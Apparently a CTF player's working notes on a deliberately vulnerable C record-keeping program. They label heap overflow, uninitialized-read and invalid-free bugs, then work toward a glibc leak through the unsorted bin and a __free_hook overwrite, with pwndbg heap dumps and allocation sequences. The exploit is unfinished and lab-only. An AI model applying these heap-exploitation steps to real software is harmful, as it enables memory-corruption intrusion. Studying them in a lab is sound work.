```c
void edit_record() {
    int index;
    printf("Input index: ");
    scanf("%d", &index);
    if (index < 0 || index >= MAX_RECORDS || records[index] == NULL) {
        puts("Invalid index!");
        return;
    }

    double temperature;
    int description_size;
    printf("Input Temperature: ");
    scanf("%lf", &temperature);
    printf("Input Description Size: ");
    scanf("%d", &description_size);
    if (description_size > MAX_DESCRIPTION_SIZE) {
        puts("Description too long!");
        return;
    } else if (description_size <= 0) {
        puts("Invalid description size!");
        return;
    }

    records[index]->temperature = temperature;
    records[index]->description_size = description_size;
    printf("Input Description: ");
    // VUL_1: BOF_W
    read(STDIN_FILENO, records[index]->description, description_size);

    puts("Record updated!");
}
```

the above function is vulnerable to buffer overflow. Because user can control the description size to a pretty large number and overflow the memory. Probably a heap buffer overflow since records is dynamically allocated with `malloc` 


```c
void print_records() {
    for (int i = 0; i < MAX_RECORDS; i++) {
        puts("==================================");
        if (records[i] != NULL) {
            printf("Record #%d\n", i);
            printf("Temperature: %lf\n", records[i]->temperature);
            printf("Description: ");
            // VUl_2: BOF_R
            // VUL_4: UUV
            write(STDOUT_FILENO, records[i]->description, records[i]->description_size);
            puts("");
        } else {
            puts("[Empty Record]");
        }
    }
    puts("==================================");
}
```
Again vulnerable to buffer overflow since `description_size` is controlled by user
ALso it might be able to read uninitialized heap data because the records that are actually created might be smaller than the amount it tries to print
I am not sure why this is a `BOF_R` instead of W

```c
void blast(char* buf) {
    // Vul_3: Invalid Free
    read(STDIN_FILENO, buf, 0x20);
    free(buf+0x10);
}
```
vulnerable because it doesn't start freeing from the head which might cause some unexpected behavior


# heap Buffer overflow

Focusing on the buffer overflow vulnerability, 

# Attempt 1:
obtain attack primitive
1. get arbirary read (with print records), leak glibc address and calculate system 
2. get arbirary write, overwrite __free_hook to system address 
## get arbirary read 
make use of unsortedbin that shows glibc address
```
Free chunk (fastbins) | PREV_INUSE
Addr: 0x55808ebc5710
Size: 0x20 (with flag bits: 0x21)
fd: 0x00

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55808ebc5730
Size: 0xa0 (with flag bits: 0xa1)
fd: 0x7fa55762fbe0
bk: 0x7fa55762fbe0

Free chunk (tcachebins)
Addr: 0x55808ebc57d0
Size: 0x20 (with flag bits: 0x20)
fd: 0x55808ebc5660

```
got it! Got one in unsorted bin, now the fd and bk points to glibc addresses 
```
fd: 0x7fa55762fbe0
bk: 0x7fa55762fbe0
```
and I should somehow print them out, perhaps using print_records, parse, then get it



I can now successfully leak a glibc address:
```
Description: [DEBUG] Received 0xd8 bytes:
    00000000  41 41 41 41  41 41 41 41  e0 cd 13 9a  d6 7f 00 00  │BBBB│BBBB│····│····│
    00000010  0a 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  │·===│====│====│====│
    00000020  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  │====│====│====│====│
    00000030  3d 3d 3d 0a  5b 45 6d 70  74 79 20 52  65 63 6f 72  │===·│[Emp│ty R│ecor│
    00000040  64 5d 0a 3d  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  │d]·=│====│====│====│
    00000050  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  │====│====│====│====│
    00000060  3d 3d 3d 3d  3d 0a 5b 45  6d 70 74 79  20 52 65 63  │====│=·[E│mpty│ Rec│
    00000070  6f 72 64 5d  0a 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  │ord]│·===│====│====│
    00000080  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  │====│====│====│====│
    00000090  3d 3d 3d 3d  3d 3d 3d 0a  5b 45 6d 70  74 79 20 52  │====│===·│[Emp│ty R│
    000000a0  65 63 6f 72  64 5d 0a 3d  3d 3d 3d 3d  3d 3d 3d 3d  │ecor│d]·=│====│====│
    000000b0  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  3d 3d 3d 3d  │====│====│====│====│
    000000c0  3d 3d 3d 3d  3d 3d 3d 3d  3d 0a 5b 45  6d 70 74 79  │====│====│=·[E│mpty│
    000000d0  20 52 65 63  6f 72 64 5d                            │ Rec│ord]│
    000000d8
AAAAAAAA\xe0\xcd\x13\x9a\xd6\x7f\x00\x00

```
what I did was:
```
delete_record(0)
delete_record(1)
delete_record(2)
delete_record(3)
delete_record(4)
delete_record(5)
delete_record(7)
delete_record(6)
add_record(0x200, b'AAAAAAAA')
add_record(0x200, b'AAAAAAAA')
add_record(0x200, b'AAAAAAAA')
add_record(0x200, b'AAAAAAAA')
add_record(0x200, b'AAAAAAAA')
add_record(0x200, b'AAAAAAAA')
add_record(0x200, b'AAAAAAAA')
add_record(0x10, b'BBBBBBBB')
print_record()
```
I used `add_record(0x10, b'BBBBBBBB')` to allocate the chunk that is the record of the free chunk which holds the glibc address as it's fd and bk pointer.
```
Allocated chunk | PREV_INUSE
Addr: 0x5595a7013fd0
Size: 0x20 (with flag bits: 0x21)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x5595a7013ff0
Size: 0x1f0 (with flag bits: 0x1f1)
fd: 0x7fd69a13cbe0
bk: 0x7fd69a13cbe0
```

But I did not leak the glibc address that is being the fd/bk pointer.
the address seems to be a glibc address pointing to `0x7fd69a13cbe0`


```
pwndbg> telescope 0x5595a7013fd0
00:0000│  0x5595a7013fd0 —▸ 0x5595a7013fe0 ◂— 0x4242424242424242 ('BBBBBBBB')
01:0008│  0x5595a7013fd8 ◂— 0x21 /* '!' */
02:0010│  0x5595a7013fe0 ◂— 0x4242424242424242 ('BBBBBBBB')
03:0018│  0x5595a7013fe8 —▸ 0x7fd69a13cde0 —▸ 0x7fd69a13cdd0 —▸ 0x7fd69a13cdc0 —▸ 0x7fd69a13cdb0 ◂— ...
04:0020│  0x5595a7013ff0 ◂— 0
05:0028│  0x5595a7013ff8 ◂— 0x1f1
06:0030│  0x5595a7014000 —▸ 0x7fd69a13cbe0 —▸ 0x5595a7014410 ◂— 0
07:0038│  0x5595a7014008 —▸ 0x7fd69a13cbe0 —▸ 0x5595a7014410 ◂— 0

```


# Attempt 2:
Here I attempt to get arbirary write to change `__free_hook` to `system`.  
Here is how the read function looks like in the program:
```c
read(STDIN_FILENO, records[index]->description, description_size);
```
From what I remember and some brain processing, I think we need to overflow and turn the function into something like the following:
```c
read(STDIN_FILENO, u64(__free_hook), description_size);
```
And then in our input, we put system


If I am correct about the above, now the problem becomes: find ways to overwrite `records[index]->description` with whatever you want


Here is how `read` function call looks like in this binary 
```
► 0x55c7e10aa3b7 <add_record+334>    call   read@plt                    <read@plt>
        fd: 0 (pipe:[1647734])
        buf: 0x55c81b5ba020 —▸ 0x7f31ef5b6be0 —▸ 0x55c81b5ba410 ◂— 0
        nbytes: 0xc8
```

So we need to overwrite `**0x55c81b5ba020**` 

What is `0x55c81b5ba020` and how to get there?

Looking at heap again:
```
Allocated chunk | PREV_INUSE
Addr: 0x55c81b5ba010
Size: 0xd0 (with flag bits: 0xd1)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x55c81b5ba0e0
Size: 0x100 (with flag bits: 0x101)
fd: 0x7f31ef5b6be0
bk: 0x7f31ef5b6be0
```
`0x55c81b5ba020` is actually the chunk we have just allocated, the user data of `0x55c81b5ba010`

by the way, here `Free chunk (unsortedbin)` turns from 0x200 to 0x100 probably because of the cut-off property, like top chunk allocating more bytes when the chunk selected for allocation does not have enough bytes 


### careful
the last chunk, previously, is now chunk 0 since we did add_record after deleting all, the first chunk would have been allocated by the last freed chunk 
```
Allocated chunk | PREV_INUSE
Addr: 0x56357751f200
Size: 0x210 (with flag bits: 0x211)

Top chunk | PREV_INUSE
Addr: 0x56357751f410
Size: 0x1fbf0 (with flag bits: 0x1fbf1)
```



```
pwndbg> x/72gx 0x56357751f210
0x56357751f210:	0x6161616261616161	0x6161616461616163
0x56357751f220:	0x6161616661616165	0x6161616861616167
0x56357751f230:	0x6161616a61616169	0x6161616c6161616b
0x56357751f240:	0x6161616e6161616d	0x616161706161616f
0x56357751f250:	0x6161617261616171	0x6161617461616173
0x56357751f260:	0x6161617661616175	0x6161617861616177
0x56357751f270:	0x6261617a61616179	0x6261616362616162
0x56357751f280:	0x6261616562616164	0x6261616762616166
0x56357751f290:	0x6261616962616168	0x6261616b6261616a
0x56357751f2a0:	0x6261616d6261616c	0x6261616f6261616e
0x56357751f2b0:	0x6261617162616170	0x6261617362616172
0x56357751f2c0:	0x6261617562616174	0x6261617762616176
0x56357751f2d0:	0x6261617962616178	0x636161626361617a
0x56357751f2e0:	0x6361616463616163	0x6361616663616165
0x56357751f2f0:	0x6361616863616167	0x6361616a63616169
0x56357751f300:	0x6361616c6361616b	0x6361616e6361616d
0x56357751f310:	0x636161706361616f	0x6361617263616171
0x56357751f320:	0x6361617463616173	0x6361617663616175
0x56357751f330:	0x6361617863616177	0x6461617a63616179
0x56357751f340:	0x6461616364616162	0x6461616564616164
0x56357751f350:	0x6461616764616166	0x6461616964616168
0x56357751f360:	0x6461616b6461616a	0x6461616d6461616c
0x56357751f370:	0x6461616f6461616e	0x6461617164616170
0x56357751f380:	0x6461617364616172	0x6461617564616174
0x56357751f390:	0x6461617764616176	0x6461617964616178
0x56357751f3a0:	0x656161626561617a	0x6561616465616163
0x56357751f3b0:	0x6561616665616165	0x6561616865616167
0x56357751f3c0:	0x6561616a65616169	0x6561616c6561616b
0x56357751f3d0:	0x6561616e6561616d	0x656161706561616f
0x56357751f3e0:	0x6561617265616171	0x6561617465616173
0x56357751f3f0:	0x6561617665616175	0x6561617865616177
0x56357751f400:	0x6661617a65616179	0x6661616366616162
0x56357751f410:	0x0000000000000000	0x000000000001fbf1
0x56357751f420:	0x0000000000000000	0x0000000000000000

```

the 512 bytes brutally overwrites everything below it!

Now that if we switch to chunk 3-5, we should be able to overwrite the neighbour chunk I guess

then edit again to change it to system?
yes, i think so!

```
pwndbg> x/72gx 0x5570ad9e44e0
0x5570ad9e44e0:	0x00005570ad9e44f0	0x0000000000000211
0x5570ad9e44f0:	0x4141414141414141	0x0000000000000000
0x5570ad9e4500:	0x0000000000000000	0x0000000000000000
0x5570ad9e4510:	0x0000000000000000	0x0000000000000000
0x5570ad9e4520:	0x0000000000000000	0x0000000000000000
0x5570ad9e4530:	0x0000000000000000	0x0000000000000000
0x5570ad9e4540:	0x0000000000000000	0x0000000000000000
0x5570ad9e4550:	0x0000000000000000	0x0000000000000000
0x5570ad9e4560:	0x0000000000000000	0x0000000000000000
0x5570ad9e4570:	0x0000000000000000	0x0000000000000000
0x5570ad9e4580:	0x0000000000000000	0x0000000000000000
0x5570ad9e4590:	0x0000000000000000	0x0000000000000000
0x5570ad9e45a0:	0x0000000000000000	0x0000000000000000
0x5570ad9e45b0:	0x0000000000000000	0x0000000000000000
0x5570ad9e45c0:	0x0000000000000000	0x0000000000000000
0x5570ad9e45d0:	0x0000000000000000	0x0000000000000000
0x5570ad9e45e0:	0x0000000000000000	0x0000000000000000
0x5570ad9e45f0:	0x0000000000000000	0x0000000000000000
0x5570ad9e4600:	0x0000000000000000	0x0000000000000000
0x5570ad9e4610:	0x0000000000000000	0x0000000000000000
0x5570ad9e4620:	0x0000000000000000	0x0000000000000000
0x5570ad9e4630:	0x0000000000000000	0x0000000000000000
0x5570ad9e4640:	0x0000000000000000	0x0000000000000000
0x5570ad9e4650:	0x0000000000000000	0x0000000000000000
0x5570ad9e4660:	0x0000000000000000	0x0000000000000000
0x5570ad9e4670:	0x0000000000000000	0x0000000000000000
0x5570ad9e4680:	0x0000000000000000	0x0000000000000000
0x5570ad9e4690:	0x0000000000000000	0x0000000000000000
0x5570ad9e46a0:	0x0000000000000000	0x0000000000000000
0x5570ad9e46b0:	0x0000000000000000	0x0000000000000000
0x5570ad9e46c0:	0x0000000000000000	0x0000000000000000
0x5570ad9e46d0:	0x0000000000000000	0x0000000000000000
0x5570ad9e46e0:	0x0000000000000000	0x0000000000000000
0x5570ad9e46f0:	0x0000000000000000	0x0000000000000021
0x5570ad9e4700:	0x3ff0000000000000	0x0000000000000200
0x5570ad9e4710:	0x00005570ad9e4720	0x0000000000000211

```

hmm but it's so empty below because it was previously allocated 200bytes!
we cannot overflow shit 
I guess maybe, we need to allocate one that is small enough?


it seems to be a bit too complicated to count and use previously added chunks, let's allocated some new chunks




# discoveries 

```
Free chunk (fastbins) | PREV_INUSE
Addr: 0x5629e5adbfb0
Size: 0x20 (with flag bits: 0x21)
fd: 0x00

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x5629e5adbfd0
Size: 0x210 (with flag bits: 0x211)
fd: 0x7fc6f1d15be0
bk: 0x7fc6f1d15be0

```
to the following

```
Allocated chunk | PREV_INUSE
Addr: 0x5629e5adbfd0
Size: 0x20 (with flag bits: 0x21)

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x5629e5adbff0
Size: 0x1f0 (with flag bits: 0x1f1)
fd: 0x7fc6f1d15be0
bk: 0x7fc6f1d15be0

```

the 20 bytes were allocated from unsorted bin, so where does fastbin go?
and why isn't it allocated with fastbin?

> This is because the fastbin chunk was directly adjacent to an unsorted bin chunk